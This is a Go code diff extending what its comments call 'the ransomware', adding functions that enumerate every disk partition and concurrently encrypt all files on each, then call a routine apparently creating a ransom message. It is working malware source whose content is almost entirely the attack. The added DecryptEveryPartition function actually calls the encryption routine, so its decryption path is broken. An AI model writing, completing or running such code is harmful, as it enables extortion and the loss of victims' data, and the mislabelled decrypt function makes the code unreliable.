@@ -5,11 +5,14 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"fmt"
+	"github.com/shirou/gopsutil/disk"
 	"io"
 	"io/ioutil"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
+	"sync"
 )
 
 func Encrypt(key, data []byte) []byte {
@@ -147,4 +150,54 @@ func RecursivelyDecryptDirectory(startingPath string, key []byte) error {
 		}
 		return DecryptFile(path, key)
 	})
+}
+
+func DecryptEveryPartition(key []byte) {
+	var wg sync.WaitGroup
+	partitions, _ := disk.Partitions(false)
+	for _, partition := range partitions {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			var err error
+			if runtime.GOOS == "windows" {
+				err = RecursivelyEncryptDirectory(partition.Mountpoint+"\\", key)
+			} else {
+				err = RecursivelyEncryptDirectory(partition.Mountpoint, key)
+			}
+			if err != nil {
+				fmt.Println(err)
+			}
+		}()
+	}
+	wg.Wait()
+}
+
+// EncryptEveryPartition for each partition, launch a new routine and wait for all to complete
+//because the ransomware will recursively run on /, it will on any partition anyway but not concurrently, think of a way to skip checking already encrypted paths that
+//doesn't affect performance
+func EncryptEveryPartition(key []byte) {
+	var wg sync.WaitGroup
+	partitions, _ := disk.Partitions(false)
+	for _, partition := range partitions {
+		wg.Add(1)
+
+		go func() {
+			defer wg.Done()
+			var err error
+			//this might get optimised by the compiler
+			if runtime.GOOS == "windows" {
+				err = RecursivelyEncryptDirectory(partition.Mountpoint+"\\", key)
+			} else {
+				err = RecursivelyEncryptDirectory(partition.Mountpoint, key)
+			}
+
+			if err != nil {
+				fmt.Println(err)
+			}
+		}()
+	}
+	wg.Wait()
+
+	CreateMessage()
 }
